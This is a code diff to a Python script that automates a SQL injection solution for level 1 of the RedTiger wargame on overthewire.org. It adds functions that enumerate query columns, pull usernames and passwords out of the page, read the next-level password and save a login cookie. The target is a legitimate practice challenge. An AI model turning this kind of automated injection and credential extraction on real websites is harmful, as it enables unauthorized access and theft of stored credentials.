@@ -4,11 +4,14 @@ from requests.exceptions import HTTPError
 import difflib
 from bs4 import BeautifulSoup
 import re
+import pickle
 
 
-def get_request(url: str, param: dict) -> str:
+def get_request(url: str, param: dict, cooks={}, method='get') -> str:
     try:
-        response = requests.get(url, params=param)
+        response = (requests.get(url, params=param, cookies=cooks)
+                    if method == 'get' else
+                    requests.post(url, data=param, cookies=cooks))
         response.raise_for_status()
     except HTTPError as http_err:
         print(f'HTTP error occurred: {http_err}')
@@ -28,7 +31,8 @@ def count_columns(url: str) -> int:
             if i > 1 and ('+' in s[0] or '-' in s[0]):
                 return i - 1
             html_responce_1 = html_responce_2
-    return 0
+    print('num of columns not find')
+    exit(1)
 
 
 def find_visible_columns(url: str, base_name: str,
@@ -49,6 +53,9 @@ def find_visible_columns(url: str, base_name: str,
                     list_of_visible.append(int(s[-1]))
             except:
                 continue
+    if not list_of_visible:
+        print('not find visible column')
+        exit(1)
     return [list_of_visible, html_responce]
 
 
@@ -77,27 +84,35 @@ def find_param(url: str, base_name: str, list_of_columns: list,
         exit(1)
 
 
+def extract_pass(response: str) -> str:
+    soup = BeautifulSoup(response.replace('<b>', ''), 'html.parser')
+    print(soup.find_all(string=re.compile("flag")))
+    passw = soup.find(string=re.compile("password"))
+    return passw
+
+
 def main():
     url = "https://redtiger.labs.overthewire.org/level1.php"
     base_name = 'level1_users'
     finds = ['username', 'password']  # what we are finding
+    pass_r = 'The password for the next level is: '
+
     columns = count_columns(url)
-    if not columns:
-        print('num of columns not find')
-        exit(1)
     list_of_columns = [str(c + 1) for c in range(columns)]
     list_of_visible, html_visible = find_visible_columns(
         url, base_name, list_of_columns)
-    if not list_of_visible:
-        print('not find visible column')
-        exit(1)
+
     keys = find_param(url, base_name, list_of_columns,
                       list_of_visible, finds, html_visible)
     print(keys)
+
     data = dict(user=keys[0], password=keys[1], login='Login')
-    response = requests.post(url, data)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    print(soup.find_all(string=re.compile("flag"))[0])
+    response = get_request(url, data, method='post')
+    passw = extract_pass(response)
+    print(passw)
+    cooks = dict(level2login=passw.replace(pass_r, ''))
+    with open('cooks.pickle', 'wb') as f:
+        pickle.dump(cooks, f)
 
 
 if __name__ == '__main__':
